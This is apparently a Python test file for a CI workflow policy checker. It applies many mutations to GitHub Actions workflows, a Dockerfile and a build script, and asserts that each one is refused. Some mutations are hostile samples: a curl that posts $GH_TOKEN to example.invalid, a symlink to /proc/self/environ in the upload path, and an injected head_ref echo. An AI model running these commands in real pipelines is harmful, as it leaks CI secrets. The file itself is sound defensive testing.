import re
import shutil
import tempfile
import unittest
from pathlib import Path

from github_api import ControlPlaneError
from workflow_policy import check_repository

ROOT = Path(__file__).resolve().parents[2]
W = ".github/workflows/"
SETUP = ".github/actions/setup-project/action.yml"
PINNED_STEP = "\n      - uses: {}@" + "a" * 40 + "\n        with: {{persist-credentials: false}}\n"
REQUEST = W + "release-request.yml"
PREPARE = "        run: python3 scripts/ci/release.py prepare\n"
RELEASE = W + "release.yml"
IMAGE = "scripts/ci/build-image.sh"
BUILD = '"$@" "$CONTEXT"'
VALIDATOR = next(step for step in re.split(r"(?m)^(?=      - )", (ROOT / REQUEST).read_text()) if PREPARE in step)
LINK = 'ln -s /proc/self/environ "$RUNNER_TEMP/upload/x"'
DOCKERFILE = "container/Dockerfile"
PUBLISH = "  extra:\n    if: needs.verify.outputs.publish == 'true'\n    environment: other\n"
MUTATIONS: tuple[tuple[str, str | None, str, str], ...] = (
    (SETUP, None, "# ${{ secrets.TOKEN }}\n", r"secrets\."),
    (W + "ci.yml", "runs-on: ubuntu-26.04", "runs-on: ubuntu-latest", "pin its runner image"),
    (W + "ci.yml", "runs-on: windows-2025", "runs-on: windows-latest", "pin its runner image"),
    (W + "release.yml", "run: python3 scripts/ci/release.py recheck",
     'run: echo "${{ github.head_ref }}"', "through env"),
    (REQUEST, "          if [[ -z", "          echo ${{ github.ref }}\n          if [[ -z",
     "through env"),
    (DOCKERFILE, None, "FROM docker.io/library/alpine:3 AS extra\n", "digest-pinned"),
    (DOCKERFILE, None, "FROM --platform=$BUILDPLATFORM ${BASE} AS extra\n", "digest-pinned"),
    (DOCKERFILE, "# Graphite Meter", "#Syntax = example/frontend\n# Graphite Meter", "BuildKit frontend"),
    (DOCKERFILE, "musl-dev:amd64=1.2.5-3.1~deb13u1", "musl-dev:amd64", "exact apt package versions"),
    (DOCKERFILE, "RUN printf 'Types: deb", "RUN apt-get update\nRUN printf 'Types: deb", "snapshot.debian.org"),
    (DOCKERFILE, "/20261016T180000Z", "", "snapshot.debian.org"),
    (W + "ci.yml", None, PINNED_STEP.format("actions/setup-node"), "through mise"),
    (REQUEST, "ref: ${{ github.sha }}", "ref: ${{ inputs.sha }}", "triggering github.sha"),
    (W + "release.yml", "cache: false", "cache: true", "cache: false"),
    (SETUP, "install_args:", "args:", "install_args"),
    (REQUEST, "cache: 'false'", "cache: 'true'", "disable every cache"),
    (SETUP, "inputs.client-deps == 'true' && inputs.cache == 'true'", "inputs.client-deps == 'true'",
     "follow the cache input"),
    (SETUP, "cache: ${{ inputs.cache }}", "cache: true", "follow the cache input"),
    (SETUP, "inputs.rust == 'true' && inputs.cache == 'true'", "inputs.rust == 'true'",
     "follow the cache input"),
    # rustup would replace itself from the network before it installs and checks a toolchain.
    (SETUP, "install --no-self-update", "install", "--no-self-update"),
    (REQUEST, None, "# allow-insecure-entitlement\n", "insecure-entitlement"),
    (IMAGE, BUILD, '--allow network.host ' + BUILD, "--allow"),
    (W + "release.yml", "TARGET_SHA: ${{ github.sha }}",
     "TARGET_SHA: ${{ needs.verify.outputs.sha }}", "TARGET_SHA"),
    (IMAGE, "--provenance mode=max", "--provenance false", "provenance mode=max"),
    (REQUEST, "PROFILE: release\n", "PROFILE: release\n          TOKEN: ${{ github.token }}\n", "read the token"),
    (REQUEST, "          GH_TOKEN: ${{ github.token }}\n", "", "GH_TOKEN must be exactly"),
    (IMAGE, "--provenance mode=max \\", "--provenance false --provenance mode=max \\", "one OCI archive export"),
    (IMAGE, 'build --target server --platform "$platform" --provenance mode=max \\\n    --output "type=oci,',
     '# --provenance mode=max \\\n    --output "type=oci,\n'
     'build --target server --platform "$platform" --provenance false \\\n    --output "type=oci,',
     "one OCI archive export"),
    (IMAGE, "--provenance false --load", "--provenance mode=min --load", "one OCI archive export"),
    (IMAGE, BUILD, "--attest type=sbom " + BUILD, "--attest"),
    (IMAGE, BUILD, '"$@" --provenance false "$CONTEXT"', "one OCI archive export"),
    (IMAGE, None, f"(sleep 600; {LINK}) &\n", "background a command or create a link"),
    (IMAGE, None, f"{LINK}\n", "background a command or create a link"),
    (REQUEST, "upload image\n", f"upload image; {LINK}\n", "directly follow"),
    (REQUEST, "upload image\n", "upload image && true\n", "directly follow"),
    (REQUEST, '          echo "context=$context" >>"$GITHUB_OUTPUT"\n',
     f'          echo "context=$context" >>"$GITHUB_OUTPUT"\n          {LINK}\n', "background a command or create a link"),
    (REQUEST, '          echo "context=$context" >>"$GITHUB_OUTPUT"\n',
     '          echo "context=$context" >>"$GITHUB_OUTPUT"\n          nohup sleep 600\n', "background a command"),
    (REQUEST, PREPARE, PREPARE + "\n" + VALIDATOR.replace("id: request", "id: copy").replace(
        PREPARE,
        '        run: curl -d "$GH_TOKEN" https://example.invalid # run: python3 scripts/ci/release.py prepare\n'),
     "only the request validator"),
    (REQUEST, PREPARE, PREPARE + "\n" + VALIDATOR.replace("id: request", "id: again"), "exactly one step"),
    (IMAGE, BUILD, "--build-context rust-amd64=docker-image://example " + BUILD, "--build-context"),
    (W + "ci.yml", None, "# --build-context\n", "substitute a build stage"),
    (REQUEST, "PROFILE: release\n", "PROFILE: release\n          TAG: ${{inputs.tag}}\n", "only the request validator"),
    (REQUEST, "PROFILE: release\n", "PROFILE: release\n          TAG: ${{ github.event.inputs.tag }}\n",
     "only the request validator"),
    (REQUEST, "PROFILE: release\n", "PROFILE: release\n          EVENT: ${{ toJSON(github.event) }}\n",
     "only the request validator"),
    (REQUEST, "PROFILE: release\n", "PROFILE: release\n          ALL: ${{ toJSON(github) }}\n",
     "only the request validator"),
    (REQUEST, "        if: env.STABLE == 'true'\n", "        if: inputs.mode == 'publish'\n",
     "only the request validator"),
    (REQUEST, "    needs: [request, image, client]\n", "    needs: [request, image, client]\n    if: always()\n",
     "past a failure"),
    (REQUEST, "    needs: [request, image, client]\n", "    needs: [request, image, client]\n    if: ${{ always() }}\n",
     "past a failure"),
    (REQUEST, "    needs: [request, image, client]\n", "    needs: [request, image, client]\n    if: '!cancelled()'\n",
     "past a failure"),
    (REQUEST, "        if: env.STABLE == 'true'\n", "        if: failure()\n", "past a failure"),
    (REQUEST, "    timeout-minutes: 90\n", "    timeout-minutes: 90\n    continue-on-error: true\n",
     "continue-on-error"),
    (REQUEST, "        run: python3 scripts/ci/assets.py upload image\n", "        run: true\n", "directly follow"),
    (REQUEST, "          path: ${{ runner.temp }}/upload/\n", "          path: ${{ runner.temp }}/release-request/\n",
     "directly follow"),
    (REQUEST, "CONTEXT: ${{ needs.request.outputs.context }}\n", "CONTEXT: .\n", "resolved CONTEXT"),
    (REQUEST, None, "# cache-from: type=gha\n", "cache-from"),
    (IMAGE, BUILD, "--cache-from type=gha " + BUILD, "cache-from"),
    (IMAGE, BUILD, "--cache-to type=gha " + BUILD, "cache-to"),
    (IMAGE, BUILD, "--secret id=GIT_AUTH_TOKEN " + BUILD, "GIT_AUTH_TOKEN"),
    (IMAGE, BUILD, "--secret id=token " + BUILD, "--secret"),
    (REQUEST, "if: github.ref != format(", "if: false && (", "misorders invariant: if:"),
    (REQUEST, "          exit 1\n", "", "misorders invariant: if:"),
    (REQUEST, "run: scripts/ci/build-image.sh", "run: true", "misorders invariant: run: scripts/ci/build-image.sh"),
    (REQUEST, '[[ "$SOURCE_SHA" =~ ^[0-9a-f]{40}$ ]]', '[[ -n "$SOURCE_SHA" ]]', "SOURCE_SHA"),
    (RELEASE, "        run: python3 scripts/ci/release.py recheck\n", "        run: true\n",
     "misorders invariant: run: python3 scripts/ci/release.py recheck"),
    (RELEASE, "run: python3 scripts/ci/release.py publish", "run: echo released", "release.py publish"),
    (RELEASE, "run: scripts/ci/publish.sh aliases", "run: echo promoted", "publish.sh aliases"),
    (RELEASE, "run: python3 scripts/ci/release.py verify", "run: echo verified", "release.py verify"),
    (RELEASE, "head_branch == 'main'\n", "head_branch != ''\n      # && github.event.workflow_run.head_branch == 'main'\n",
     "head_branch == 'main'"),
    (SETUP, "        python3 scripts/ci/toolchains.py verify-rust\n", "", "verify-rust"),
    (W + "advisories.yml", "run: cargo deny --locked check advisories\n", "run: cargo deny --locked check bans\n",
     "check advisories"),
    (REQUEST, PREPARE, PREPARE + "\n      - run: echo \"$RAW\"\n        env:\n"
     "          RAW: ${{ inputs.sha }}\n", "only the request validator"),
    (REQUEST, "EVENT_SHA: ${{ github.sha }}", "EVENT_SHA: ${{ inputs.sha }}", "EVENT_SHA"),
    (REQUEST, "name: Assemble request", "name: Assemble the request", "as release.py expects"),
    (REQUEST, "platform: [linux/amd64, linux/arm64, windows/amd64, windows/arm64]",
     "platform: [linux/amd64, linux/arm64, windows/amd64]", "as release.py expects"),
    (REQUEST, "\njobs:\n", "\njobs:\n  other:\n    name: Another job\n    runs-on: ubuntu-26.04\n"
     "    steps:\n      - run: true\n", "as release.py expects"),
    (REQUEST, "    name: Build server image (${{ matrix.platform }})\n    needs: request\n",
     "    name: Build server image (${{ matrix.platform }})\n", "every build must need request"),
    (REQUEST, "platform: [linux/amd64, linux/arm64]\n", "platform: [linux/amd64]\n", "as release.py expects"),
    (REQUEST, None, "\n  again:\n    name: Assemble request\n    needs: request\n    runs-on: ubuntu-26.04\n"
     "    steps:\n      - run: true\n", "once each"),
    (REQUEST, "    needs: [request, image, client]\n", "    needs: [image, client]\n", "every build must need request"),
    (REQUEST, "  contents: read", "  contents: write", "write permission"),
    (REQUEST, "  contents: read\n", "  contents: read\n  actions: read\n", "only read contents"),
    (REQUEST, "    runs-on:", "    permissions: read-all\n    runs-on:", "only read contents"),
    (REQUEST, "    steps:\n", "    steps:" + PINNED_STEP.format("actions/cache"), "repository code"),
    (W + "release.yml", "environment: ghcr-release", "environment: other", "ghcr-release"),
    (W + "release.yml", "    if: needs.verify.outputs.publish == 'true'\n    needs: verify\n",
     "    needs: verify\n", "release secrets"),
    (W + "release.yml", "secrets.GHCR_TOKEN", "secrets.OTHER_TOKEN", "release secrets"),
    (W + "release.yml", None, "  extra:\n    environment: ghcr-release\n", "release secrets"),
    (RELEASE, None, PUBLISH + "    env:\n      TOKEN: ${{ secrets.GHCR_TOKEN }}\n", "release secrets"),
    (W + "ci.yml", None, "# ${{ secrets.GHCR_TOKEN }}\n", r"secrets\."),
    (W + "ci.yml", None, "  extra:\n    environment: ghcr-release\n", "must not use environment:"),
    (W + "release.yml", "on:\n", "on:\n  push:\n    tags: ['v*']\n", "triggered only by"),
    (W + "release.yml", "on:\n", "on:\n  workflow_dispatch:\n", "triggered only by"),
    (W + "ci.yml", "on:\n", "on:\n  pull_request_target:\n", "triggered only by"),
    (W + "advisories.yml", "on:\n", "on:\n  pull_request:\n", "triggered only by"),
    (W + "advisories.yml", "cache: 'false'", "cache: 'true'", "advisories.yml must disable every cache"),
    (W + "extra.yml", None, "on:\n  push:\n", "unreviewed workflow set"),
    (W + "ci.yml", "permissions:\n  contents: read\n\nenv:", "env:", "top-level permissions"),
    (W + "ci.yml", "      pull-requests: read\n", "      pull-requests: write\n", "write permission"),
    (W + "release.yml", "    steps:\n", "    steps:" + PINNED_STEP.format("actions/cache"), "repository code"),
    (W + "release.yml", "        run: python3 scripts/ci/release.py verify\n",
     "        run: python3 scripts/ci/release.py verify\n      - run: mise run check\n", "mise run"),
    (RELEASE, "github.event.workflow_run.conclusion == 'success'\n      && ", "", "conclusion == 'success'"),
    (RELEASE, "workflow_run.event == 'workflow_dispatch'", "workflow_run.event != 'push'", "workflow_dispatch"),
    (RELEASE, "head_branch == 'main'", "head_branch != ''", "head_branch == 'main'"),
    (RELEASE, "workflow_run.path == '.github", "workflow_run.path != '.github", "path =="),
    (RELEASE, "        if: steps.verify.outputs.publish == 'true'\n", "", "hand off"),
    (RELEASE, "group: release-publish-${{ github.repository }}",
     "group: release-publish-${{ github.run_id }}", "group: release-publish"),
    (RELEASE, "cancel-in-progress: false", "cancel-in-progress: true", "cancel-in-progress"),
    (RELEASE, "SOURCE_SHA: ${{ needs.verify.outputs.sha }}",
     "SOURCE_SHA: ${{ github.event.workflow_run.head_sha }}", "SOURCE_SHA must be exactly"),
    (RELEASE, "IMAGE_TAG: ${{ needs.verify.outputs.version }}\n", "IMAGE_TAG: latest\n",
     "IMAGE_TAG must be exactly"),
    (RELEASE, None, "# ${{ github.event.pull_request.head.sha }}\n", "pull_request.head"),
    (RELEASE, "secrets.GHCR_TOKEN", "secrets['GHCR_TOKEN']", r"secrets\["),
    ("certs/dev.txt", None, "local development certificate", "TLS certificate/key paths"),
    ("notes.txt", None, "-----BEGIN " + "PRIVATE KEY-----", "PEM"),
    # CI runs every step of the local gate and needs every job.
    (W + "ci.yml", "mise run rust-check\n", "cargo test\n", "local gate step check"),
    (W + "ci.yml", "mise run rust-check-targets\n", "cargo check\n", "local gate step rust-check-targets"),
    (W + "ci.yml", "mise run delayed-downloads\n", "true\n", "local gate step delayed-downloads"),
    (W + "ci.yml", "check_git_sources --verify\n", "check_git_sources\n", "check_git_sources --verify"),
    (W + "ci.yml", "plan, checks, rust", "plan, rust", r"Gate must need every job: \['checks'\]"),
    (W + "ci.yml", "cache: ${{ github.event_name != 'schedule' }}", "cache: 'true'", "must not cache on schedule"),
    # Development notices stay out of CI and releases, directly or through a task, script or driver a job runs.
    (W + "ci.yml", None, "# mise run dev\n", "development notices"),
    ("mise.toml", "[tasks.rust-check]\n", '[tasks.rust-check]\ndepends = ["tui-build"]\n', "development notices"),
    (DOCKERFILE, None, "RUN python3 -m scripts.legal.rust --development\n", "development notices"),
    (DOCKERFILE, "--browser-scan /tmp/browser-modules.json \\", "--browser-scan /tmp/browser-modules.json --development \\",
     "development notices"),
    ("scripts/verify-container.sh", None, "python3 -m scripts.build\n", "development notices"),
    ("rust/interop/browser.py", None, 'BUILD = ["python3", "-m", "scripts.build"]\n', "development notices"),
    ("scripts/package.py", None, 'DEVELOPMENT = "--development"\n', "development notices"),
    (W + "ci.yml", "python3 rust/interop/browser.py", "python3 rust/interop/absent.py", "absent.py, which CI"),
    # Supply-chain files have an owner, and Dependabot updates every lockfile.
    (".github/CODEOWNERS", "rust-toolchain.toml              @zR-JB\n", "",
     r"without an owner: \['rust/rust-toolchain.toml'\]"),
    ("rust/server/tools/build.rs", None, "fn main() {}\n", r"without an owner: \['rust/server/tools/build.rs'\]"),
    (".github/dependabot.yml", "  - package-ecosystem: cargo\n    directory: /rust\n",
     "  - package-ecosystem: cargo\n    directory: /\n", "must update cargo in /rust"),
)


class WorkflowPolicyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        directory = tempfile.TemporaryDirectory()
        cls.addClassCleanup(directory.cleanup)
        cls.root = Path(directory.name)
        shutil.copytree(ROOT / ".github", cls.root / ".github")
        for name in ("scripts", "rust/interop"):
            shutil.copytree(ROOT / name, cls.root / name, ignore=shutil.ignore_patterns("__pycache__"))
        for name in ("mise.toml", "mise.lock", "client/bun.lock", "container/Dockerfile", "rust/rust-toolchain.toml",
                     "rust/Cargo.lock"):
            (cls.root / name).parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(ROOT / name, cls.root / name)

    def refused(self, name: str, text: str, error: str) -> None:
        """Check the copy with `name` holding `text`, then restore it."""
        path = self.root / name
        original = path.read_text() if path.exists() else None
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        try:
            with self.assertRaisesRegex(ControlPlaneError, error):
                check_repository(self.root)
        finally:
            if original is None:
                path.unlink()
            else:
                path.write_text(original)

    def test_repository_satisfies_policy(self) -> None:
        check_repository(self.root)

    def test_each_violation_is_rejected(self) -> None:
        for name, old, new, error in MUTATIONS:
            with self.subTest(name=name, error=error):
                text = (ROOT / name).read_text() if (ROOT / name).exists() else ""
                if old is not None:
                    self.assertIn(old, text)
                self.refused(name, text + new if old is None else text.replace(old, new, 1), error)

    def test_release_identity_comes_only_from_the_run_context(self) -> None:
        for name, marker in ((REQUEST, "release.py prepare"), (RELEASE, "release.py verify"),
                             (RELEASE, "release.py publish")):
            text = (ROOT / name).read_text()
            step = next(step for step in re.split(r"(?m)^(?=      - )", text) if marker in step)
            for variable in re.findall(r"(?m)^ +(?!GH_TOKEN)([A-Z_]+): \$\{\{ github\.", step):
                with self.subTest(marker=marker, variable=variable):
                    rebound = re.sub(rf"(?m)^( +{variable}): .*$", r"\1: ${{ github.job }}", step)
                    self.refused(name, text.replace(step, rebound), f" {variable} must be exactly")


if __name__ == "__main__":
    unittest.main()
